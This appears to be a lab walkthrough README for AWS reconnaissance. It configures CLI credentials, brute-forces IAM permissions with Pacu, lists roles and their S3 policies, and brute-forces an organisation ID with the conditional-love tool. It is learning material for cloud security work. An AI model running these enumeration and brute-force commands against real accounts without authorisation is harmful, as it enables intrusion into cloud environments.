# aws-account-organisation-id-

## STEP-1 configure aws account using the aws cli  

### use the command
```
aws configure --profile <set_profile_name>
```  

<img width="1394" height="178" alt="image" src="https://github.com/user-attachments/assets/f3b1a5e6-c499-46b3-a518-d80e781536b7" />  
<br/>
<br/>
### whoami on the configured account
whoami equivalent for aws cli is the following
<br/>

```bash
aws sts get-caller-identity --profile <profile_name>
```  
<img width="432" height="141" alt="image" src="https://github.com/user-attachments/assets/ccfab08f-3d50-48ac-8296-61ce42061f85" />  
<br/>
<br/>
## STEP-2 using pacu to bruteforce access control of the acc 
though we can do this normally via a script, pacu makes it very easy for us. download it from the [pacu-github](https://github.com/rhinosecuritylabs/pacu)  

```bash
run iam__bruteforce_permissions --region us-east-1
```
<img width="1095" height="285" alt="image" src="https://github.com/user-attachments/assets/d0da0903-621e-4f54-8424-bfbb5ecc7397" />
<br/>
<br/>
#### we see this iam.list-roles()  
lets run the roles available using the aws cli using
```
aws iam list-roles --profile cyber-org-name        
```
<br/>
<br/>

going through all the roles we see this:

```
        {
            "Path": "/",
            "RoleName": "S3AccessImages",
            "RoleId": "AROA2TREN6VAMSZWIPQDZ",
            "Arn": "arn:aws:iam::729147110720:role/S3AccessImages",
            "CreateDate": "2026-10-16T17:56:53+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::729147110720:user/Daniel"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]

```

### to list the policies of an iam role we can use the command
```
aws iam list-role-policies --role-name S3AccessImages --profile <profile_name>
```
<br/>

we get
```
                                                                                                                                                          
┌──(kali㉿localserver)-[~]
└─$ aws iam list-role-policies --role-name S3AccessImages --profile cyber-org-name
{
    "PolicyNames": [
        "AccessS3BucketObjects"
    ]
}
                                            
```

now that we have the role policy name, we can list the policy by the command:
```
aws iam get-role-policy --role-name S3AccessImages --policy-name AccessS3BucketObjects --profile cyber-org-name
```

we get 
```
{
    "RoleName": "S3AccessImages",
    "PolicyName": "AccessS3BucketObjects",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "s3:ListBucket",
                    "s3:GetObject"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::img.cybrlabs.io",
                    "arn:aws:s3:::img.cybrlabs.io/*"
                ]
            }
        ]
    }
}

```

we have the list bucket and the getobject actions available
<br/><br/>

## installing conditional-love
clone repo and install the requirements 
```
git clone https://github.com/plerionhq/conditional-love.git
```

go into the repo dir, set up a venv and install the requirements
```
┌──(cl-venv)─(kali㉿localserver)-[~/Desktop/git-tools/conditional-love]
└─$ pip3 install -r requirements.txt 

```

then we can start using it :
```
python3 conditional-love.py -h
```
<img width="1117" height="313" alt="image" src="https://github.com/user-attachments/assets/ee42f663-1f75-4c4f-a693-b1e7986a3ea9" />

<br/><br/>

## STEP-3 use the conditional-love command to bruteforce the org id

```
python3 conditional-love.py --role 'arn:aws:iam::729147110720:role/S3AccessImages' --profile 'cyber-org-name' --target 's3://img.cybrlabs.io' --condition=aws:ResourceOrgID --action=s3:HeadObject --alphabet 'abcdefghijklmnopqrstuvwxyz1234567890'

```
